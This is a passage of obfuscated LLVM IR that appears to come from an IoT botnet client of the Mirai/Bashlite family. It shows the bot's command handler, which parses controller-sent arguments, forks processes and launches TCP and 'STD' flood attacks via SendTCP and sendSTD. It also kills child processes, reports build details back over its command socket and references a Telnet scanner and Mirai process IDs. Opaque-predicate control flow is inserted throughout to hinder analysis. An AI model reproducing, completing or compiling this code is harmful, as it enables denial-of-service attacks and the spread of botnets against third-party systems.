  %1645 = load i8**, i8*** %12, align 8
  %1646 = getelementptr inbounds i8*, i8** %1645, i64 3
  %1647 = load i8*, i8** %1646, align 8
  %1648 = call i32 @atoi(i8* %1647) #9
  store i32 %1648, i32* %38, align 4
  %1649 = load i8**, i8*** %12, align 8
  %1650 = getelementptr inbounds i8*, i8** %1649, i64 4
  %1651 = load i8*, i8** %1650, align 8
  store i8* %1651, i8** %39, align 8
  %1652 = load i32, i32* %11, align 4
  %1653 = icmp eq i32 %1652, 7
  br i1 %1653, label %1654, label %1659

; <label>:1654:                                   ; preds = %1637
  %1655 = load i8**, i8*** %12, align 8
  %1656 = getelementptr inbounds i8*, i8** %1655, i64 6
  %1657 = load i8*, i8** %1656, align 8
  %1658 = call i32 @atoi(i8* %1657) #9
  br label %1660

; <label>:1659:                                   ; preds = %1637
  br label %1660

; <label>:1660:                                   ; preds = %1659, %1654
  %1661 = phi i32 [ %1658, %1654 ], [ 10, %1659 ]
  store i32 %1661, i32* %40, align 4
  %1662 = load i32, i32* %11, align 4
  %1663 = icmp sgt i32 %1662, 5
  br i1 %1663, label %1664, label %1685

; <label>:1664:                                   ; preds = %1660
  %1665 = load i32, i32* @x.115
  %1666 = load i32, i32* @y.116
  %1667 = sub i32 %1665, 1
  %1668 = mul i32 %1665, %1667
  %1669 = urem i32 %1668, 2
  %1670 = icmp eq i32 %1669, 0
  %1671 = icmp slt i32 %1666, 10
  %1672 = or i1 %1670, %1671
  br i1 %1672, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1664
  %1673 = load i8**, i8*** %12, align 8
  %1674 = getelementptr inbounds i8*, i8** %1673, i64 5
  %1675 = load i8*, i8** %1674, align 8
  %1676 = call i32 @atoi(i8* %1675) #9
  %1677 = load i32, i32* @x.115
  %1678 = load i32, i32* @y.116
  %1679 = sub i32 %1677, 1
  %1680 = mul i32 %1677, %1679
  %1681 = urem i32 %1680, 2
  %1682 = icmp eq i32 %1681, 0
  %1683 = icmp slt i32 %1678, 10
  %1684 = or i1 %1682, %1683
  br i1 %1684, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br label %1686

; <label>:1685:                                   ; preds = %1660
  br label %1686

; <label>:1686:                                   ; preds = %1685, %originalBBpart2228
  %1687 = phi i32 [ %1676, %originalBBpart2228 ], [ 0, %1685 ]
  store i32 %1687, i32* %41, align 4
  store i32 32, i32* %42, align 4
  %1688 = load i8*, i8** %36, align 8
  %1689 = call i8* @strstr(i8* %1688, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #9
  %1690 = icmp ne i8* %1689, null
  br i1 %1690, label %1691, label %1759

; <label>:1691:                                   ; preds = %1686
  %1692 = load i8*, i8** %36, align 8
  %1693 = call i8* @strtok(i8* %1692, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %1693, i8** %43, align 8
  br label %1694

; <label>:1694:                                   ; preds = %originalBBpart2240, %1691
  %1695 = load i32, i32* @x.115
  %1696 = load i32, i32* @y.116
  %1697 = sub i32 %1695, 1
  %1698 = mul i32 %1695, %1697
  %1699 = urem i32 %1698, 2
  %1700 = icmp eq i32 %1699, 0
  %1701 = icmp slt i32 %1696, 10
  %1702 = or i1 %1700, %1701
  br i1 %1702, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1694
  %1703 = load i8*, i8** %43, align 8
  %1704 = icmp ne i8* %1703, null
  %1705 = load i32, i32* @x.115
  %1706 = load i32, i32* @y.116
  %1707 = sub i32 %1705, 1
  %1708 = mul i32 %1705, %1707
  %1709 = urem i32 %1708, 2
  %1710 = icmp eq i32 %1709, 0
  %1711 = icmp slt i32 %1706, 10
  %1712 = or i1 %1710, %1711
  br i1 %1712, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br i1 %1704, label %1713, label %1758

; <label>:1713:                                   ; preds = %originalBBpart2232
  %1714 = load i32, i32* @x.115
  %1715 = load i32, i32* @y.116
  %1716 = sub i32 %1714, 1
  %1717 = mul i32 %1714, %1716
  %1718 = urem i32 %1717, 2
  %1719 = icmp eq i32 %1718, 0
  %1720 = icmp slt i32 %1715, 10
  %1721 = or i1 %1719, %1720
  br i1 %1721, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1713
  %1722 = call i32 @listFork()
  %1723 = icmp ne i32 %1722, 0
  %1724 = load i32, i32* @x.115
  %1725 = load i32, i32* @y.116
  %1726 = sub i32 %1724, 1
  %1727 = mul i32 %1724, %1726
  %1728 = urem i32 %1727, 2
  %1729 = icmp eq i32 %1728, 0
  %1730 = icmp slt i32 %1725, 10
  %1731 = or i1 %1729, %1730
  br i1 %1731, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br i1 %1723, label %1740, label %1732

; <label>:1732:                                   ; preds = %originalBBpart2236
  %1733 = load i8*, i8** %43, align 8
  %1734 = load i32, i32* %37, align 4
  %1735 = load i32, i32* %38, align 4
  %1736 = load i8*, i8** %39, align 8
  %1737 = load i32, i32* %41, align 4
  %1738 = load i32, i32* %40, align 4
  %1739 = load i32, i32* %42, align 4
  call void @SendTCP(i8* %1733, i32 %1734, i32 %1735, i8* %1736, i32 %1737, i32 %1738, i32 %1739)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1740:                                   ; preds = %originalBBpart2236
  %1741 = load i32, i32* @x.115
  %1742 = load i32, i32* @y.116
  %1743 = sub i32 %1741, 1
  %1744 = mul i32 %1741, %1743
  %1745 = urem i32 %1744, 2
  %1746 = icmp eq i32 %1745, 0
  %1747 = icmp slt i32 %1742, 10
  %1748 = or i1 %1746, %1747
  br i1 %1748, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1740
  %1749 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %1749, i8** %43, align 8
  %1750 = load i32, i32* @x.115
  %1751 = load i32, i32* @y.116
  %1752 = sub i32 %1750, 1
  %1753 = mul i32 %1750, %1752
  %1754 = urem i32 %1753, 2
  %1755 = icmp eq i32 %1754, 0
  %1756 = icmp slt i32 %1751, 10
  %1757 = or i1 %1755, %1756
  br i1 %1757, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br label %1694

; <label>:1758:                                   ; preds = %originalBBpart2232
  br label %1787

; <label>:1759:                                   ; preds = %1686
  %1760 = call i32 @listFork()
  %1761 = icmp ne i32 %1760, 0
  br i1 %1761, label %1762, label %1763

; <label>:1762:                                   ; preds = %1759
  br label %2070

; <label>:1763:                                   ; preds = %1759
  %1764 = load i32, i32* @x.115
  %1765 = load i32, i32* @y.116
  %1766 = sub i32 %1764, 1
  %1767 = mul i32 %1764, %1766
  %1768 = urem i32 %1767, 2
  %1769 = icmp eq i32 %1768, 0
  %1770 = icmp slt i32 %1765, 10
  %1771 = or i1 %1769, %1770
  br i1 %1771, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1763
  %1772 = load i8*, i8** %36, align 8
  %1773 = load i32, i32* %37, align 4
  %1774 = load i32, i32* %38, align 4
  %1775 = load i8*, i8** %39, align 8
  %1776 = load i32, i32* %41, align 4
  %1777 = load i32, i32* %40, align 4
  %1778 = load i32, i32* %42, align 4
  call void @SendTCP(i8* %1772, i32 %1773, i32 %1774, i8* %1775, i32 %1776, i32 %1777, i32 %1778)
  call void @_exit(i32 0) #12
  %1779 = load i32, i32* @x.115
  %1780 = load i32, i32* @y.116
  %1781 = sub i32 %1779, 1
  %1782 = mul i32 %1779, %1781
  %1783 = urem i32 %1782, 2
  %1784 = icmp eq i32 %1783, 0
  %1785 = icmp slt i32 %1780, 10
  %1786 = or i1 %1784, %1785
  br i1 %1786, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  unreachable

; <label>:1787:                                   ; preds = %1758
  %1788 = load i32, i32* @x.115
  %1789 = load i32, i32* @y.116
  %1790 = sub i32 %1788, 1
  %1791 = mul i32 %1788, %1790
  %1792 = urem i32 %1791, 2
  %1793 = icmp eq i32 %1792, 0
  %1794 = icmp slt i32 %1789, 10
  %1795 = or i1 %1793, %1794
  br i1 %1795, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1787
  %1796 = load i32, i32* @x.115
  %1797 = load i32, i32* @y.116
  %1798 = sub i32 %1796, 1
  %1799 = mul i32 %1796, %1798
  %1800 = urem i32 %1799, 2
  %1801 = icmp eq i32 %1800, 0
  %1802 = icmp slt i32 %1797, 10
  %1803 = or i1 %1801, %1802
  br i1 %1803, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br label %1804

; <label>:1804:                                   ; preds = %originalBBpart2248, %originalBBpart2212
  %1805 = load i8**, i8*** %12, align 8
  %1806 = getelementptr inbounds i8*, i8** %1805, i64 0
  %1807 = load i8*, i8** %1806, align 8
  %1808 = call i32 @strcmp(i8* %1807, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.945, i32 0, i32 0)) #9
  %1809 = icmp ne i32 %1808, 0
  br i1 %1809, label %1946, label %1810

; <label>:1810:                                   ; preds = %1804
  %1811 = load i32, i32* %11, align 4
  %1812 = icmp slt i32 %1811, 4
  br i1 %1812, label %1825, label %1813

; <label>:1813:                                   ; preds = %1810
  %1814 = load i8**, i8*** %12, align 8
  %1815 = getelementptr inbounds i8*, i8** %1814, i64 2
  %1816 = load i8*, i8** %1815, align 8
  %1817 = call i32 @atoi(i8* %1816) #9
  %1818 = icmp slt i32 %1817, 1
  br i1 %1818, label %1825, label %1819

; <label>:1819:                                   ; preds = %1813
  %1820 = load i8**, i8*** %12, align 8
  %1821 = getelementptr inbounds i8*, i8** %1820, i64 3
  %1822 = load i8*, i8** %1821, align 8
  %1823 = call i32 @atoi(i8* %1822) #9
  %1824 = icmp slt i32 %1823, 1
  br i1 %1824, label %1825, label %1842

; <label>:1825:                                   ; preds = %1819, %1813, %1810
  %1826 = load i32, i32* @x.115
  %1827 = load i32, i32* @y.116
  %1828 = sub i32 %1826, 1
  %1829 = mul i32 %1826, %1828
  %1830 = urem i32 %1829, 2
  %1831 = icmp eq i32 %1830, 0
  %1832 = icmp slt i32 %1827, 10
  %1833 = or i1 %1831, %1832
  br i1 %1833, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1825
  %1834 = load i32, i32* @x.115
  %1835 = load i32, i32* @y.116
  %1836 = sub i32 %1834, 1
  %1837 = mul i32 %1834, %1836
  %1838 = urem i32 %1837, 2
  %1839 = icmp eq i32 %1838, 0
  %1840 = icmp slt i32 %1835, 10
  %1841 = or i1 %1839, %1840
  br i1 %1841, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br label %2070

; <label>:1842:                                   ; preds = %1819
  %1843 = load i8**, i8*** %12, align 8
  %1844 = getelementptr inbounds i8*, i8** %1843, i64 1
  %1845 = load i8*, i8** %1844, align 8
  store i8* %1845, i8** %44, align 8
  %1846 = load i8**, i8*** %12, align 8
  %1847 = getelementptr inbounds i8*, i8** %1846, i64 2
  %1848 = load i8*, i8** %1847, align 8
  %1849 = call i32 @atoi(i8* %1848) #9
  store i32 %1849, i32* %45, align 4
  %1850 = load i8**, i8*** %12, align 8
  %1851 = getelementptr inbounds i8*, i8** %1850, i64 3
  %1852 = load i8*, i8** %1851, align 8
  %1853 = call i32 @atoi(i8* %1852) #9
  store i32 %1853, i32* %46, align 4
  %1854 = load i8*, i8** %44, align 8
  %1855 = call i8* @strstr(i8* %1854, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #9
  %1856 = icmp ne i8* %1855, null
  br i1 %1856, label %1857, label %1937

; <label>:1857:                                   ; preds = %1842
  %1858 = load i32, i32* @x.115
  %1859 = load i32, i32* @y.116
  %1860 = sub i32 %1858, 1
  %1861 = mul i32 %1858, %1860
  %1862 = urem i32 %1861, 2
  %1863 = icmp eq i32 %1862, 0
  %1864 = icmp slt i32 %1859, 10
  %1865 = or i1 %1863, %1864
  br i1 %1865, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1857
  %1866 = load i8*, i8** %44, align 8
  %1867 = call i8* @strtok(i8* %1866, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %1867, i8** %47, align 8
  %1868 = load i32, i32* @x.115
  %1869 = load i32, i32* @y.116
  %1870 = sub i32 %1868, 1
  %1871 = mul i32 %1868, %1870
  %1872 = urem i32 %1871, 2
  %1873 = icmp eq i32 %1872, 0
  %1874 = icmp slt i32 %1869, 10
  %1875 = or i1 %1873, %1874
  br i1 %1875, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %1876

; <label>:1876:                                   ; preds = %1918, %originalBBpart2256
  %1877 = load i8*, i8** %47, align 8
  %1878 = icmp ne i8* %1877, null
  br i1 %1878, label %1879, label %1920

; <label>:1879:                                   ; preds = %1876
  %1880 = load i32, i32* @x.115
  %1881 = load i32, i32* @y.116
  %1882 = sub i32 %1880, 1
  %1883 = mul i32 %1880, %1882
  %1884 = urem i32 %1883, 2
  %1885 = icmp eq i32 %1884, 0
  %1886 = icmp slt i32 %1881, 10
  %1887 = or i1 %1885, %1886
  br i1 %1887, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %1879
  %1888 = call i32 @listFork()
  %1889 = icmp ne i32 %1888, 0
  %1890 = load i32, i32* @x.115
  %1891 = load i32, i32* @y.116
  %1892 = sub i32 %1890, 1
  %1893 = mul i32 %1890, %1892
  %1894 = urem i32 %1893, 2
  %1895 = icmp eq i32 %1894, 0
  %1896 = icmp slt i32 %1891, 10
  %1897 = or i1 %1895, %1896
  br i1 %1897, label %originalBBpart2260, label %originalBB258alteredBB

originalBBpart2260:                               ; preds = %originalBB258
  br i1 %1889, label %1918, label %1898

; <label>:1898:                                   ; preds = %originalBBpart2260
  %1899 = load i32, i32* @x.115
  %1900 = load i32, i32* @y.116
  %1901 = sub i32 %1899, 1
  %1902 = mul i32 %1899, %1901
  %1903 = urem i32 %1902, 2
  %1904 = icmp eq i32 %1903, 0
  %1905 = icmp slt i32 %1900, 10
  %1906 = or i1 %1904, %1905
  br i1 %1906, label %originalBB262, label %originalBB262alteredBB

originalBB262:                                    ; preds = %originalBB262alteredBB, %1898
  %1907 = load i8*, i8** %47, align 8
  %1908 = load i32, i32* %45, align 4
  %1909 = load i32, i32* %46, align 4
  call void @sendSTD(i8* %1907, i32 %1908, i32 %1909)
  call void @_exit(i32 0) #12
  %1910 = load i32, i32* @x.115
  %1911 = load i32, i32* @y.116
  %1912 = sub i32 %1910, 1
  %1913 = mul i32 %1910, %1912
  %1914 = urem i32 %1913, 2
  %1915 = icmp eq i32 %1914, 0
  %1916 = icmp slt i32 %1911, 10
  %1917 = or i1 %1915, %1916
  br i1 %1917, label %originalBBpart2264, label %originalBB262alteredBB

originalBBpart2264:                               ; preds = %originalBB262
  unreachable

; <label>:1918:                                   ; preds = %originalBBpart2260
  %1919 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %1919, i8** %47, align 8
  br label %1876

; <label>:1920:                                   ; preds = %1876
  %1921 = load i32, i32* @x.115
  %1922 = load i32, i32* @y.116
  %1923 = sub i32 %1921, 1
  %1924 = mul i32 %1921, %1923
  %1925 = urem i32 %1924, 2
  %1926 = icmp eq i32 %1925, 0
  %1927 = icmp slt i32 %1922, 10
  %1928 = or i1 %1926, %1927
  br i1 %1928, label %originalBB266, label %originalBB266alteredBB

originalBB266:                                    ; preds = %originalBB266alteredBB, %1920
  %1929 = load i32, i32* @x.115
  %1930 = load i32, i32* @y.116
  %1931 = sub i32 %1929, 1
  %1932 = mul i32 %1929, %1931
  %1933 = urem i32 %1932, 2
  %1934 = icmp eq i32 %1933, 0
  %1935 = icmp slt i32 %1930, 10
  %1936 = or i1 %1934, %1935
  br i1 %1936, label %originalBBpart2268, label %originalBB266alteredBB

originalBBpart2268:                               ; preds = %originalBB266
  br label %1945

; <label>:1937:                                   ; preds = %1842
  %1938 = call i32 @listFork()
  %1939 = icmp ne i32 %1938, 0
  br i1 %1939, label %1940, label %1941

; <label>:1940:                                   ; preds = %1937
  br label %2070

; <label>:1941:                                   ; preds = %1937
  %1942 = load i8*, i8** %44, align 8
  %1943 = load i32, i32* %45, align 4
  %1944 = load i32, i32* %46, align 4
  call void @sendSTD(i8* %1942, i32 %1943, i32 %1944)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1945:                                   ; preds = %originalBBpart2268
  br label %1946

; <label>:1946:                                   ; preds = %1945, %1804
  %1947 = load i8**, i8*** %12, align 8
  %1948 = getelementptr inbounds i8*, i8** %1947, i64 0
  %1949 = load i8*, i8** %1948, align 8
  %1950 = call i32 @strcmp(i8* %1949, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.946, i32 0, i32 0)) #9
  %1951 = icmp ne i32 %1950, 0
  br i1 %1951, label %2036, label %1952

; <label>:1952:                                   ; preds = %1946
  %1953 = load i32, i32* @x.115
  %1954 = load i32, i32* @y.116
  %1955 = sub i32 %1953, 1
  %1956 = mul i32 %1953, %1955
  %1957 = urem i32 %1956, 2
  %1958 = icmp eq i32 %1957, 0
  %1959 = icmp slt i32 %1954, 10
  %1960 = or i1 %1958, %1959
  br i1 %1960, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %1952
  store i32 0, i32* %48, align 4
  store i64 0, i64* %49, align 8
  %1961 = load i32, i32* @x.115
  %1962 = load i32, i32* @y.116
  %1963 = sub i32 %1961, 1
  %1964 = mul i32 %1961, %1963
  %1965 = urem i32 %1964, 2
  %1966 = icmp eq i32 %1965, 0
  %1967 = icmp slt i32 %1962, 10
  %1968 = or i1 %1966, %1967
  br i1 %1968, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br label %1969

; <label>:1969:                                   ; preds = %1995, %originalBBpart2272
  %1970 = load i64, i64* %49, align 8
  %1971 = load i64, i64* @numpids, align 8
  %1972 = icmp ult i64 %1970, %1971
  br i1 %1972, label %1973, label %1998

; <label>:1973:                                   ; preds = %1969
  %1974 = load i32*, i32** @pids, align 8
  %1975 = load i64, i64* %49, align 8
  %1976 = getelementptr inbounds i32, i32* %1974, i64 %1975
  %1977 = load i32, i32* %1976, align 4
  %1978 = icmp ne i32 %1977, 0
  br i1 %1978, label %1979, label %1994

; <label>:1979:                                   ; preds = %1973
  %1980 = load i32*, i32** @pids, align 8
  %1981 = load i64, i64* %49, align 8
  %1982 = getelementptr inbounds i32, i32* %1980, i64 %1981
  %1983 = load i32, i32* %1982, align 4
  %1984 = call i32 @getpid() #5
  %1985 = icmp ne i32 %1983, %1984
  br i1 %1985, label %1986, label %1994

; <label>:1986:                                   ; preds = %1979
  %1987 = load i32*, i32** @pids, align 8
  %1988 = load i64, i64* %49, align 8
  %1989 = getelementptr inbounds i32, i32* %1987, i64 %1988
  %1990 = load i32, i32* %1989, align 4
  %1991 = call i32 @kill(i32 %1990, i32 9) #5
  %1992 = load i32, i32* %48, align 4
  %1993 = add nsw i32 %1992, 1
  store i32 %1993, i32* %48, align 4
  br label %1994

; <label>:1994:                                   ; preds = %1986, %1979, %1973
  br label %1995

; <label>:1995:                                   ; preds = %1994
  %1996 = load i64, i64* %49, align 8
  %1997 = add i64 %1996, 1
  store i64 %1997, i64* %49, align 8
  br label %1969

; <label>:1998:                                   ; preds = %1969
  %1999 = load i32, i32* @x.115
  %2000 = load i32, i32* @y.116
  %2001 = sub i32 %1999, 1
  %2002 = mul i32 %1999, %2001
  %2003 = urem i32 %2002, 2
  %2004 = icmp eq i32 %2003, 0
  %2005 = icmp slt i32 %2000, 10
  %2006 = or i1 %2004, %2005
  br i1 %2006, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %1998
  %2007 = load i32, i32* %48, align 4
  %2008 = icmp sgt i32 %2007, 0
  %2009 = load i32, i32* @x.115
  %2010 = load i32, i32* @y.116
  %2011 = sub i32 %2009, 1
  %2012 = mul i32 %2009, %2011
  %2013 = urem i32 %2012, 2
  %2014 = icmp eq i32 %2013, 0
  %2015 = icmp slt i32 %2010, 10
  %2016 = or i1 %2014, %2015
  br i1 %2016, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br i1 %2008, label %2017, label %2034

; <label>:2017:                                   ; preds = %originalBBpart2276
  %2018 = load i32, i32* @x.115
  %2019 = load i32, i32* @y.116
  %2020 = sub i32 %2018, 1
  %2021 = mul i32 %2018, %2020
  %2022 = urem i32 %2021, 2
  %2023 = icmp eq i32 %2022, 0
  %2024 = icmp slt i32 %2019, 10
  %2025 = or i1 %2023, %2024
  br i1 %2025, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %2017
  %2026 = load i32, i32* @x.115
  %2027 = load i32, i32* @y.116
  %2028 = sub i32 %2026, 1
  %2029 = mul i32 %2026, %2028
  %2030 = urem i32 %2029, 2
  %2031 = icmp eq i32 %2030, 0
  %2032 = icmp slt i32 %2027, 10
  %2033 = or i1 %2031, %2032
  br i1 %2033, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br label %2035

; <label>:2034:                                   ; preds = %originalBBpart2276
  br label %2035

; <label>:2035:                                   ; preds = %2034, %originalBBpart2280
  br label %2036

; <label>:2036:                                   ; preds = %2035, %1946
  %2037 = load i8**, i8*** %12, align 8
  %2038 = getelementptr inbounds i8*, i8** %2037, i64 0
  %2039 = load i8*, i8** %2038, align 8
  %2040 = call i32 @strcmp(i8* %2039, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.947, i32 0, i32 0)) #9
  %2041 = icmp ne i32 %2040, 0
  br i1 %2041, label %2059, label %2042

; <label>:2042:                                   ; preds = %2036
  %2043 = load i32, i32* @x.115
  %2044 = load i32, i32* @y.116
  %2045 = sub i32 %2043, 1
  %2046 = mul i32 %2043, %2045
  %2047 = urem i32 %2046, 2
  %2048 = icmp eq i32 %2047, 0
  %2049 = icmp slt i32 %2044, 10
  %2050 = or i1 %2048, %2049
  br i1 %2050, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2042
  call void @exit(i32 0) #11
  %2051 = load i32, i32* @x.115
  %2052 = load i32, i32* @y.116
  %2053 = sub i32 %2051, 1
  %2054 = mul i32 %2051, %2053
  %2055 = urem i32 %2054, 2
  %2056 = icmp eq i32 %2055, 0
  %2057 = icmp slt i32 %2052, 10
  %2058 = or i1 %2056, %2057
  br i1 %2058, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  unreachable

; <label>:2059:                                   ; preds = %2036
  %2060 = load i8**, i8*** %12, align 8
  %2061 = getelementptr inbounds i8*, i8** %2060, i64 0
  %2062 = load i8*, i8** %2061, align 8
  %2063 = call i32 @strcmp(i8* %2062, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.948, i32 0, i32 0)) #9
  %2064 = icmp ne i32 %2063, 0
  br i1 %2064, label %2070, label %2065

; <label>:2065:                                   ; preds = %2059
  call void @RemoveTempDirs()
  %2066 = load i32, i32* @mainCommSock, align 4
  %2067 = call i8* @getBuild()
  %2068 = call i32 @getEndianness()
  %2069 = call i32 (i32, i8*, ...) @sockprintf(i32 %2066, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.949, i32 0, i32 0), i8* %2067, i32 %2068)
  br label %2070

; <label>:2070:                                   ; preds = %2065, %2059, %1940, %originalBBpart2252, %1762, %originalBBpart2224, %originalBBpart2208, %originalBBpart2184, %1246, %originalBBpart2168, %originalBBpart2160, %1148, %1143, %1114, %1088, %originalBBpart2136, %1022, %originalBBpart2132, %originalBBpart2128, %962, %919, %854, %originalBBpart2104, %796, %767, %757, %747, %originalBBpart284, %originalBBpart280, %originalBBpart276, %610, %originalBBpart272, %574, %originalBBpart264, %454, %355, %350, %274, %234, %167, %162, %103
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %2071 = alloca i32, align 4
  %2072 = alloca i8**, align 8
  %2073 = alloca i32, align 4
  %2074 = alloca i32, align 4
  %2075 = alloca i32, align 4
  %2076 = alloca i32, align 4
  %2077 = alloca i32, align 4
  %2078 = alloca i32, align 4
  %2079 = alloca i32, align 4
  %2080 = alloca i32, align 4
  %2081 = alloca i32, align 4
  %2082 = alloca i32, align 4
  %2083 = alloca i32, align 4
  %2084 = alloca i32, align 4
  %2085 = alloca i32, align 4
  %2086 = alloca i32, align 4
  %2087 = alloca i32, align 4
  %2088 = alloca i32, align 4
  %2089 = alloca i8*, align 8
  %2090 = alloca i32, align 4
  %2091 = alloca i32, align 4
  %2092 = alloca i32, align 4
  %2093 = alloca i32, align 4
  %2094 = alloca i32, align 4
  %2095 = alloca i8*, align 8
  %2096 = alloca i8*, align 8
  %2097 = alloca i32, align 4
  %2098 = alloca i32, align 4
  %2099 = alloca i8*, align 8
  %2100 = alloca i32, align 4
  %2101 = alloca i32, align 4
  %2102 = alloca i32, align 4
  %2103 = alloca i8*, align 8
  %2104 = alloca i8*, align 8
  %2105 = alloca i32, align 4
  %2106 = alloca i32, align 4
  %2107 = alloca i8*, align 8
  %2108 = alloca i32, align 4
  %2109 = alloca i64, align 8
  store i32 %0, i32* %2071, align 4
  store i8** %1, i8*** %2072, align 8
  %2110 = load i8**, i8*** %2072, align 8
  %2111 = getelementptr inbounds i8*, i8** %2110, i64 0
  %2112 = load i8*, i8** %2111, align 8
  %2113 = call i32 @strcmp(i8* %2112, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.923, i32 0, i32 0)) #9
  %2114 = icmp ne i32 %2113, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %2115 = load i32, i32* @mainCommSock, align 4
  %2116 = call i32 (i32, i8*, ...) @sockprintf(i32 %2115, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.924, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %104
  %2117 = load i8**, i8*** %12, align 8
  %2118 = getelementptr inbounds i8*, i8** %2117, i64 0
  %2119 = load i8*, i8** %2118, align 8
  %2120 = call i32 @strcmp(i8* %2119, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.926, i32 0, i32 0)) #9
  %2121 = icmp ne i32 %2120, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %126
  %2122 = load i8**, i8*** %12, align 8
  %2123 = getelementptr inbounds i8*, i8** %2122, i64 1
  %2124 = load i8*, i8** %2123, align 8
  %2125 = call i32 @strcmp(i8* %2124, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %2126 = icmp ne i32 %2125, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %193
  %2127 = load i8**, i8*** %12, align 8
  %2128 = getelementptr inbounds i8*, i8** %2127, i64 1
  %2129 = load i8*, i8** %2128, align 8
  %2130 = call i32 @strcmp(i8* %2129, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %2131 = icmp ne i32 %2130, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %215
  %2132 = load i32, i32* @scanPid, align 4
  %2133 = icmp eq i32 %2132, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %255
  %2134 = load i32, i32* %18, align 4
  %2135 = load i32, i32* %17, align 4
  call void @TelnetScanner(i32 %2134, i32 %2135)
  call void @_exit(i32 0) #12
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %276
  %2136 = load i8**, i8*** %12, align 8
  %2137 = getelementptr inbounds i8*, i8** %2136, i64 0
  %2138 = load i8*, i8** %2137, align 8
  %2139 = call i32 @strcmp(i8* %2138, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.930, i32 0, i32 0)) #9
  %2140 = icmp ne i32 %2139, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %298
  %2141 = load i8**, i8*** %12, align 8
  %2142 = getelementptr inbounds i8*, i8** %2141, i64 1
  %2143 = load i8*, i8** %2142, align 8
  %2144 = call i32 @strcmp(i8* %2143, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %2145 = icmp ne i32 %2144, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %326
  store i32 500, i32* %22, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %356
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %374
  %2146 = load i32, i32* %20, align 4
  %2147 = load i32, i32* %21, align 4
  %2148 = icmp slt i32 %2146, %2147
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %412
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %435
  %2149 = load i32, i32* @miraiPid, align 4
  %2150 = icmp eq i32 %2149, 0
